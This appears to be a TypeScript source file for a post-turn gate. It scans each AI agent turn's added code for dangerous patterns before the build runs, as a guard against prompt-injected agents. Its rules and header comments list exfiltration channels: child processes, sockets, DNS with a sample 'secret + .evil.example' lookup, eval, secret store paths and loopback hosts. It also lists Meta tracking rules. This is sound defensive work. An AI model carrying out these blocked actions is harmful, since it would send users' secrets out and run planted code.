// §3f.9 The post-turn gate (`turnGate`): deterministic rules over ONE agent turn's added lines, run
// after EVERY agent turn (and on a nested `--resume`) BEFORE any build or T0 runs anything.
//
// Why it exists (R2-03, §3a.9 item 5): between turns the wizard EXECUTES agent-written code — the build
// check evaluates `next.config.*` and page modules, T0 runs the site's JS. A prompt-injected agent could
// plant code that runs then, while no agent child is alive. The build and T0 are sandboxed (O6), and
// this gate refuses the obvious channels before they ever run. Each hit is a `problem` with file:line;
// O3's fence reverts the hunk and blocks the job.
//
// Two rule sets:
//   • EXECUTION SAFETY (R2-03): new `child_process`, `net`/`tls`, `dgram`, `worker_threads`,
//     `http(s).request|get`; Node internals (`vm`, `module`, `process.binding`); in build-time files any
//     network call that is not a relative-path literal (`fetch(u)`, `axios`, `XMLHttpRequest`, a fetch
//     library, a global reached by a computed name); `eval` in any position, `Function(` with or
//     without `new`, `require(` / `import(` of a computed string, `createRequire`; and the literals
//     `.growth-os`, `Application Support/Infinite` anywhere, and loopback in a CONNECTION form
//     anywhere (see `hasLoopbackLiteral`).
//   • THE NEVER-LIST (R2-20, the brief's Meta rules): a write to `_fbp`; `ph` (as `ph:` or shorthand)
//     inside `fbq(` / Advanced Matching / `adMatch`; `autoConfig` true, or a removed `autoConfig … false`
//     opt-out (literal or variable pixel); a provider-id literal that is not one of the connection's ids
//     (a fallback `fbq('init', env || '<15 digits>')` included); `test_event_code` (it is NOT
//     protection); a page-built `eventID` / `event_id` (a `metaEventId ?? uuid()` fallback is built);
//     `fbq('track', <standard conversion>)` in a click handler (a same-file named handler included), or
//     anywhere in page code without an `eventID` (D11: the browser mirrors a conversion only with the
//     server's `metaEventId`).
//
// HOW A LINE IS READ. A code rule matches the RAW added line — strings and trailing comments included —
// so no quoting trick (`const a = "x//"; require("child_process")`) can hide the rest of the line. The
// one exception is a line that is ONLY a comment (its comment-masked view, computed over the whole file
// after the turn or else over the hunk, is blank, and it starts like a comment): prose in a JSDoc block
// does not trip `eval(`. The literal rules ignore that exception and read every line.
//
// LOOPBACK (§3f.9 deviation, recorded in the lane note): `127.0.0.1` is refused in every form EXCEPT a
// whole quoted host literal (`"127.0.0.1"` / `'127.0.0.1'`) — the shape infinite-tag's own preview
// guard, managed runtime and server lane emit in their host deny lists (jobs 7, 2 and 1 place those
// bytes). A URL, a `host:port`, a template, or any string with more in it is refused, as is `localhost:`
// anywhere, `[::1]:<port>` and `0.0.0.0:<port>`. A bare literal cannot reach the bridge on its own:
// building a URL from it needs a request call, which the rules refuse in build-time files, and the build
// and T0 run sandboxed (O6).
//
// A crash of the gate itself is a PROBLEM (o9.ts), never `undetermined`: O3's fence acts on problems
// only, and an unchecked turn must be reverted, not kept.
//
// Incident guarded (PORT-PLAN §4, 22d08d4 "phantom CompleteRegistrations"): an event id built in the
// page — refused at the turn, not found after deploy. And the 9fcbefa default-id leak: a provider id
// literal that is not the connection's is refused.
import type { CheckContext, CheckResult, TurnDiff } from "../wizard/contracts/jobs.js"
import { codeView, isServerFile, matchingBracket } from "../setup-checks/code-view.js"
import { META_STANDARD_CONVERSIONS, findEventIdHits, findStandardOnClick } from "../setup-checks/meta-event-id.js"

import { checkResult } from "./result.js"

export const TURN_GATE_CHECK_ID = "turn_gate" as const

export const TURN_GATE_RULES = {
  child_process: "starts a child process",
  net: "opens a raw network socket (net/tls)",
  dgram: "opens a UDP socket (dgram)",
  worker_threads: "starts a worker thread",
  http_request: "makes an HTTP request with node:http(s)",
  node_internals: "reaches Node internals (vm, module, process.binding)",
  build_time_fetch: "makes a network request from code the build runs",
  computed_global: "reaches a global by a computed name in code the build runs",
  dns: "resolves names with node:dns (a DNS exfiltration channel)",
  fs_write: "writes the file system from code the build runs",
  eval: "calls eval",
  new_function: "builds code with Function(",
  computed_require: "loads a computed module path (require / import / createRequire)",
  secret_path_literal: "names a secret store path (.growth-os / Application Support/Infinite)",
  loopback_literal: "addresses a loopback listener (127.0.0.1 / localhost:)",
  fbp_write: "writes Meta's _fbp cookie (never synthesise _fbp)",
  ph_in_meta: "sends a phone number (ph) to Meta",
  autoconfig_on: "turns Meta's automatic configuration on",
  autoconfig_opt_out_removed: "removes the autoConfig false opt-out",
  foreign_provider_id: "adds a provider id that is not the connection's",
  test_event_code: "uses test_event_code (it is not protection)",
  page_built_event_id: "builds a Meta event id in the page (use the server's metaEventId)",
  standard_on_click: "fires a standard Meta conversion from a click handler",
  conversion_without_event_id: "fires a Meta conversion from the page without the server's metaEventId"
} as const
export type TurnGateRule = keyof typeof TURN_GATE_RULES

export interface TurnGateHit {
  rule: TurnGateRule
  file: string
  /** New-file line for an added line; OLD-file line for `autoconfig_opt_out_removed`. */
  line: number
}

export interface TurnGateOptions {
  /** The connection's public ids (GA4 stream ids, PostHog key, Meta pixel ids). */
  connectionIds: readonly string[]
  /** The file's content AFTER the turn, for rules that need context (click handlers, fbq calls). */
  readFile?: (path: string) => string | null
}

const BUILD_TIME_FILE = /(?:^|\/)(?:(?:next|vite|postcss|tailwind)\.config\.[cm]?[jt]s|vercel\.json|middleware\.[jt]s)$/
const SCRIPTS_DIR = /(?:^|\/)scripts\//
/** A `scripts/` folder under one of these is shipped page code (`public/scripts/widget.js`), not a build step. */
const PAGE_CODE_DIR = /(?:^|\/)(?:public|static|assets|src|app|pages|components|lib)\//

/** Files the build never executes: markup, styles, data and assets. */
const NOT_EXECUTED = /\.(?:html?|css|scss|sass|less|md|json|svg|txt|ya?ml|png|jpe?g|gif|webp|ico|woff2?)$/i
const PUBLIC_DIR = /(?:^|\/)(?:public|static)\//
const CODE_FILE = /\.(?:[cm]?[jt]sx?|astro|vue|svelte|mdx)$/i
/**
 * A `"use client"` directive as the file's first statement (whitespace, `//` line comments and block comments
 * before it allowed). A scan, not a regex: `(?:\/\*[\s\S]*?\*\/\s*)*` can split one run of comments many
 * ways and backtracks exponentially on a file that opens with many `/*` and no directive.
 */
export function hasClientDirective(full: string): boolean {
  let at = 0
  for (;;) {
    while (at < full.length && /\s/.test(full[at]!)) at += 1
    if (full.startsWith("//", at)) {
      const newline = full.indexOf("\n", at + 2)
      if (newline === -1) return false
      at = newline + 1
    } else if (full.startsWith("/*", at)) {
      const close = full.indexOf("*/", at + 2)
      if (close === -1) return false
      at = close + 2
    } else {
      break
    }
  }
  const open = full[at]
  const close = full[at + 11]
  return (open === '"' || open === "'") && full.startsWith("use client", at + 1) && (close === '"' || close === "'")
}

/**
 * Review I1 P1-3: code the wizard's own build EXECUTES (network on, `.env` loaded): every build-time file, and
 * every code file outside `public/`/`static/` that is not a `"use client"` module (server components, route
 * handlers, server actions and the modules they import are rendered or bundled by the build, and prerender
 * runs them). An unreadable file counts as executed (fail closed).
 */
export function isServerExecutedFile(path: string, full: string | null): boolean {
  if (isBuildTimeFile(path)) return true
  if (PUBLIC_DIR.test(path) || NOT_EXECUTED.test(path) || !CODE_FILE.test(path)) return false
  return full === null || !hasClientDirective(full)
}

/** `next.config.*`, `vite.config.*`, `vercel.json`, `middleware.*`, `postcss/tailwind.config.*`, a repo or app `scripts/**`. */
export function isBuildTimeFile(path: string): boolean {
  if (BUILD_TIME_FILE.test(path)) return true
  const scripts = SCRIPTS_DIR.exec(path)
  if (!scripts) return false
  return !PAGE_CODE_DIR.test(path.slice(0, scripts.index + 1))
}

const QUOTE = "[\"'`]"
const moduleLoad = (name: string) =>
  new RegExp(String.raw`(?:\brequire\s*\(\s*|\bfrom\s+|\bimport\s*\(\s*|\bimport\s+)${QUOTE}(?:node:)?(?:${name})(?:/[\w/]*)?${QUOTE}`)
/** A plain string argument: `"./x"`, `'x'`, or a template with no `${`. */
const PLAIN_ARG = String.raw`(?:"[^"$\x60\\]*"|'[^'$\x60\\]*'|\x60[^\x60$\\]*\x60)\s*[,)]`
/** A relative-path literal (`"/api/x"`), the one shape a build-time request may take. */
const RELATIVE_ARG = String.raw`(?:"\/(?![\/\\])[^"$\x60\\]*"|'\/(?![\/\\])[^'$\x60\\]*'|\x60\/(?![\/\\])[^\x60$\\]*\x60)\s*[,)]`

const LINE_RULES: ReadonlyArray<{ rule: TurnGateRule; pattern: RegExp; buildTimeOnly?: boolean }> = [
  { rule: "child_process", pattern: moduleLoad("child_process") },
  { rule: "net", pattern: moduleLoad("net|tls") },
  { rule: "dgram", pattern: moduleLoad("dgram") },
  { rule: "worker_threads", pattern: moduleLoad("worker_threads") },
  { rule: "http_request", pattern: moduleLoad("https?|http2") },
  { rule: "http_request", pattern: /\bhttps?\s*\.\s*(?:request|get)\s*\(/ },
  { rule: "node_internals", pattern: moduleLoad("vm|module|inspector|cluster|v8") },
  { rule: "node_internals", pattern: /\bprocess\s*\.\s*(?:binding|_linkedBinding|dlopen|mainModule)\b|\bmodule\s*\.\s*(?:require|constructor)\b/ },
  // B19: `process.getBuiltinModule("child_process")` loads any Node module without an import or require.
  { rule: "node_internals", pattern: /\bgetBuiltinModule\s*\(/ },
  // B: name resolution is a channel of its own (`dns.resolve(secret + ".evil.example")`), in any file.
  { rule: "dns", pattern: moduleLoad("dns|dns/promises") },
  // Code the build runs (review I1 P1-3; build-time files and every server-executed module): any request that is
  // not a relative-path literal (a variable URL is the exfil path), the file system, and globals reached by name.
  { rule: "build_time_fetch", pattern: new RegExp(String.raw`(?<![\w$])fetch(?![\w$])(?!\s*\(\s*${RELATIVE_ARG})`), buildTimeOnly: true },
  { rule: "build_time_fetch", pattern: /\baxios\b|\bXMLHttpRequest\b|\bWebSocket\b|\bEventSource\b|\bsendBeacon\b/, buildTimeOnly: true },
  { rule: "build_time_fetch", pattern: moduleLoad("undici|node-fetch|cross-fetch|isomorphic-fetch|got|ky|ws"), buildTimeOnly: true },
  { rule: "computed_global", pattern: /(?<![\w$])(?:globalThis|global|self|window)\s*(?:\?\.\s*)?\[/, buildTimeOnly: true },
  { rule: "computed_global", pattern: /\bReflect\s*\.\s*(?:get|apply|construct|getOwnPropertyDescriptor|ownKeys)\s*\(|\bObject\s*\.\s*getOwnPropertyDescriptors?\s*\(\s*(?:globalThis|global|self|window)\b/, buildTimeOnly: true },
  { rule: "fs_write", pattern: moduleLoad("fs|fs/promises"), buildTimeOnly: true },
  {
    rule: "fs_write",
    pattern: /\b(?:writeFile|writeFileSync|appendFile|appendFileSync|createWriteStream|copyFile|copyFileSync|cpSync|symlink|symlinkSync|link|linkSync|chmod|chmodSync|rename|renameSync|unlink|unlinkSync|rmSync|rmdirSync|mkdirSync|truncateSync|utimesSync)\s*\(/,
    buildTimeOnly: true
  },
  { rule: "eval", pattern: /(?<![\w$])eval(?![\w$])(?!\s*:)/ },
  { rule: "new_function", pattern: /(?<![\w$])Function\s*\(|\.\s*constructor\s*\(|\[\s*["'`]constructor["'`]\s*\]/ },
  { rule: "computed_require", pattern: new RegExp(String.raw`(?<![\w$.])(?:require|import)\s*\(\s*(?!${PLAIN_ARG}|$)`) },
  { rule: "computed_require", pattern: /\bcreateRequire\b/ },
  { rule: "autoconfig_on", pattern: /fbq\s*\(\s*["']set["']\s*,\s*["']autoConfig["']\s*,\s*(?:true\b|["']true["']|!0|1\b)/ },
  { rule: "test_event_code", pattern: /\btest_event_code\b|\btestEventCode\b/ }
]
/** A call opened at the end of a line whose argument is on the next one (`require(\n  "./x"\n)`). */
const OPEN_CALL_AT_END = /(?<![\w$.])(?:require|import)\s*\(\s*$/
const PLAIN_ARG_START = /^\s*(?:"[^"$`\\]*"|'[^'$`\\]*'|`[^`$\\]*`)\s*(?:[,)]|$)/

const SECRET_PATH = /\.growth-os|Application Support\/Infinite/

/**
 * Loopback in a form that could address a listener: `localhost:` anywhere, `[::1]:<port>`,
 * `0.0.0.0:<port>`, and `127.0.0.1` anywhere EXCEPT as a whole quoted host literal (the deny-list shape
 * infinite-tag itself emits). See the header for why.
 */
export function hasLoopbackLiteral(text: string): boolean {
  if (/localhost:|\[::1\]:\d|0\.0\.0\.0:\d/.test(text)) return true
  for (const match of text.matchAll(/127\.0\.0\.1/g)) {
    const at = match.index ?? 0
    const before = text[at - 1]
    const after = text[at + match[0].length]
    const wholeLiteral = (before === '"' || before === "'") && after === before
    // A whole literal glued into a larger string (`'127.0.0.1' + ':' + port`, `${'127.0.0.1'}`) is a URL piece.
    const glued = /\+\s*$|\$\{\s*$/.test(text.slice(0, at - 1)) || /^\s*\+/.test(text.slice(at + match[0].length + 1))
    if (!wholeLiteral || glued) return true
  }
  return false
}

const FBP_WRITE = [/document\.cookie\s*=.*_fbp/, /\.set\s*\(\s*["'`]_fbp["'`]/, /["'`]_fbp=/, /setCookie\s*\(\s*["'`]_fbp/i, /\b_fbp\s*=\s*["'`]fb\./]
/** `fbq('set', 'autoConfig', false, <pixel>)` — the pixel argument as written (a literal or a variable). */
const OPT_OUT = /fbq\s*\(\s*["']set["']\s*,\s*["']autoConfig["']\s*,\s*(?:false\b|["']false["']|!1|0\b)\s*(?:,\s*([^)]*?))?\s*\)/
const PROVIDER_ID_LITERALS: RegExp[] = [
  /["'`](G-[A-Z0-9]{4,})["'`]/g,
  /["'`](phc_[A-Za-z0-9_]{10,})["'`]/g,
  /\bfbq\s*\(\s*["']init["']\s*,\s*["'](\d{15,16})["']/g,
  /\b(?:pixelId|pixel_id|metaPixelId)\s*[:=]\s*["'`](\d{15,16})["'`]/g
]
/** A line naming a pixel: every 15–16 digit literal on it is a pixel id (`PIXEL_ID || '999…'`). */
const PIXEL_NAMED = /pixel/i
const DIGIT_ID_LITERAL = /["'`](\d{15,16})["'`]/g
const META_MATCH_TRIGGER = /\bfbq\s*\(|\badMatch\b|\b(?:infiniteMetaAdvancedMatch|__infiniteMetaMatch|advancedMatching|AdvancedMatch)\b/g
/** `ph:` or the shorthand `{ em, ph }`. */
const PH_KEY = /(?:^|[{,\s])["']?ph["']?\s*(?::|(?=[,}]))/
const FBQ_INIT = /\bfbq\s*\(\s*["']init["']\s*,/g
const CONVERSION_TRACK = new RegExp(String.raw`\bfbq\s*\(\s*["']track["']\s*,\s*["'](?:${META_STANDARD_CONVERSIONS.join("|")})["']`, "g")

/** Contiguous added lines, as hunks of text with their first line number. */
function hunksOf(added: ReadonlyArray<{ line: number; text: string }>): Array<{ start: number; text: string; lines: number[] }> {
  const sorted = [...added].sort((a, b) => a.line - b.line)
  const hunks: Array<{ start: number; text: string; lines: number[] }> = []
  for (const entry of sorted) {
    const last = hunks[hunks.length - 1]
    if (last && entry.line === (last.lines[last.lines.length - 1] as number) + 1) {
      last.text += `\n${entry.text}`
      last.lines.push(entry.line)
    } else hunks.push({ start: entry.line, text: entry.text, lines: [entry.line] })
  }
  return hunks
}

function lineAt(text: string, offset: number): number {
  let line = 0
  for (let index = 0; index < offset && index < text.length; index += 1) if (text.charCodeAt(index) === 10) line += 1
  return line
}

/** The comment-masked view of each added line: from the whole file after the turn, else from its hunk. */
function maskedAddedLines(path: string, added: ReadonlyArray<{ line: number; text: string }>, full: string | null): Map<number, string> {
  const masked = new Map<number, string>()
  const rawLines = full === null ? null : full.split("\n")
  const fullLines = full === null ? null : codeView(path, full).split("\n")
  const fromHunks = new Map<number, string>()
  for (const hunk of hunksOf(added)) {
    codeView(path, hunk.text)
      .split("\n")
      .forEach((text, index) => fromHunks.set(hunk.start + index, text))
  }
  for (const { line, text } of added) {
    // The whole-file view is used only when the file really holds this line there.
    const fromFull = rawLines && fullLines && rawLines[line - 1] === text ? fullLines[line - 1] : undefined
    const view = fromFull ?? fromHunks.get(line)
    if (view !== undefined) masked.set(line, view)
  }
  return masked
}

/** Is this added line only a comment? (its masked view is blank and it starts like a comment) */
function commentOnly(raw: string, masked: string | undefined): boolean {
  return masked !== undefined && masked.trim() === "" && /^\s*(?:\/\/|\/\*|\*|<!--)/.test(raw)
}

/** Contextual rules over a text whose first line is `startLine`; keeps hits on added lines only. */
function contextualHits(file: string, text: string, startLine: number, addedLines: ReadonlySet<number>, allowed: ReadonlySet<string>): TurnGateHit[] {
  const code = codeView(file, text)
  const hits: TurnGateHit[] = []
  const push = (rule: TurnGateRule, offset: number) => {
    const line = startLine + lineAt(code, offset)
    if (addedLines.has(line) && !hits.some((hit) => hit.rule === rule && hit.line === line)) hits.push({ rule, file, line })
  }
  const pageCode = !isServerFile(file)
  for (const hit of findStandardOnClick(code)) push("standard_on_click", hit.offset)
  if (pageCode) for (const hit of findEventIdHits(code)) push("page_built_event_id", hit.offset)
  // A conversion fired from page code must carry the server's id (D11); one with no eventID at all is refused.
  if (pageCode) {
    for (const match of code.matchAll(CONVERSION_TRACK)) {
      const at = match.index ?? 0
      const open = code.indexOf("(", at)
      const end = matchingBracket(code, open)
      const call = code.slice(at, end === -1 ? code.length : end + 1)
      if (!/\beventID\b/.test(call)) push("conversion_without_event_id", at)
    }
  }
  for (const match of code.matchAll(META_MATCH_TRIGGER)) {
    const at = match.index ?? 0
    const open = code.slice(at).search(/[({]/)
    if (open === -1 || open > 40) continue
    const end = matchingBracket(code, at + open)
    const region = code.slice(at, end === -1 ? code.length : end + 1)
    const ph = PH_KEY.exec(region)
    if (ph) push("ph_in_meta", at + ph.index + (ph[0].length - ph[0].trimStart().length))
  }
  // Every 15–16 digit literal inside an `fbq('init', …)` call is a pixel id: a fallback next to an env
  // var (`env.PIXEL || '999…'`) must be the connection's too.
  for (const match of code.matchAll(FBQ_INIT)) {
    const at = match.index ?? 0
    const open = code.indexOf("(", at)
    const end = matchingBracket(code, open)
    const call = code.slice(at, end === -1 ? code.length : end + 1)
    for (const literal of call.matchAll(DIGIT_ID_LITERAL)) {
      if (!allowed.has(literal[1] as string)) push("foreign_provider_id", at + (literal.index ?? 0))
    }
  }
  return hits
}

/** Every rule hit in one turn's diff. Pure. */
export function scanTurnDiff(diff: TurnDiff, options: TurnGateOptions): TurnGateHit[] {
  const allowed = new Set(options.connectionIds)
  const hits: TurnGateHit[] = []
  const add = (hit: TurnGateHit) => {
    if (!hits.some((other) => other.rule === hit.rule && other.file === hit.file && other.line === hit.line)) hits.push(hit)
  }
  for (const file of diff.files) {
    const full = file.added.length > 0 ? (options.readFile?.(file.path) ?? null) : null
    // "Build-time only" rules apply to every file the build EXECUTES (review I1 P1-3), not only to configs.
    const buildTime = isServerExecutedFile(file.path, full)
    const masked = maskedAddedLines(file.path, file.added, full)
    const byLine = new Map(file.added.map((entry) => [entry.line, entry.text]))
    for (const { line, text } of file.added) {
      // The literal rules read every line, comments included.
      if (SECRET_PATH.test(text)) add({ rule: "secret_path_literal", file: file.path, line })
      if (hasLoopbackLiteral(text)) add({ rule: "loopback_literal", file: file.path, line })
      if (commentOnly(text, masked.get(line))) continue
      // Code rules read the RAW line: no string or comment trick hides the rest of it.
      for (const { rule, pattern, buildTimeOnly } of LINE_RULES) {
        if (buildTimeOnly && !buildTime) continue
        if (pattern.test(text)) add({ rule, file: file.path, line })
      }
      if (OPEN_CALL_AT_END.test(text)) {
        const next = byLine.get(line + 1)
        if (next === undefined || !PLAIN_ARG_START.test(next)) add({ rule: "computed_require", file: file.path, line })
      }
      if (/_fbp/.test(text) && FBP_WRITE.some((pattern) => pattern.test(text))) add({ rule: "fbp_write", file: file.path, line })
      for (const pattern of PROVIDER_ID_LITERALS) {
        for (const match of text.matchAll(pattern)) {
          if (!allowed.has(match[1] as string)) add({ rule: "foreign_provider_id", file: file.path, line })
        }
      }
      if (PIXEL_NAMED.test(text)) {
        for (const match of text.matchAll(DIGIT_ID_LITERAL)) {
          if (!allowed.has(match[1] as string)) add({ rule: "foreign_provider_id", file: file.path, line })
        }
      }
    }
    // A removed opt-out with no equivalent added back for the same pixel argument.
    for (const { line, text } of file.removed) {
      const optOut = OPT_OUT.exec(text)
      if (!optOut) continue
      const pixel = (optOut[1] ?? "").replace(/\s+/g, "")
      const restored = file.added.some((entry) => {
        const again = OPT_OUT.exec(entry.text)
        return again !== null && (again[1] ?? "").replace(/\s+/g, "") === pixel
      })
      if (!restored) add({ rule: "autoconfig_opt_out_removed", file: file.path, line })
    }
    // Rules that need the surrounding code.
    if (file.added.length === 0) continue
    const addedLines = new Set(file.added.map((entry) => entry.line))
    if (full !== null) {
      for (const hit of contextualHits(file.path, full, 1, addedLines, allowed)) add(hit)
    } else {
      for (const hunk of hunksOf(file.added)) for (const hit of contextualHits(file.path, hunk.text, hunk.start, addedLines, allowed)) add(hit)
    }
  }
  return hits
}

/** §3e.7 `turnGate(diff, {connectionIds})` as `CheckResult[]`: one problem per hit, or one pass. */
export function turnGate(diff: TurnDiff, options: TurnGateOptions, ctx: Pick<CheckContext, "runId" | "now">): CheckResult[] {
  const hits = scanTurnDiff(diff, options)
  if (hits.length === 0) {
    const lines = diff.files.reduce((sum, file) => sum + file.added.length, 0)
    return [checkResult(TURN_GATE_CHECK_ID, "pass", "S", ctx, { reason: `${lines} added line${lines === 1 ? "" : "s"} checked: nothing executable or forbidden` })]
  }
  return hits.map((hit) =>
    checkResult(TURN_GATE_CHECK_ID, "problem", "S", ctx, {
      reason: `${hit.rule}: the edit ${TURN_GATE_RULES[hit.rule]}`,
      evidence: [{ file: hit.file, line: hit.line }]
    })
  )
}
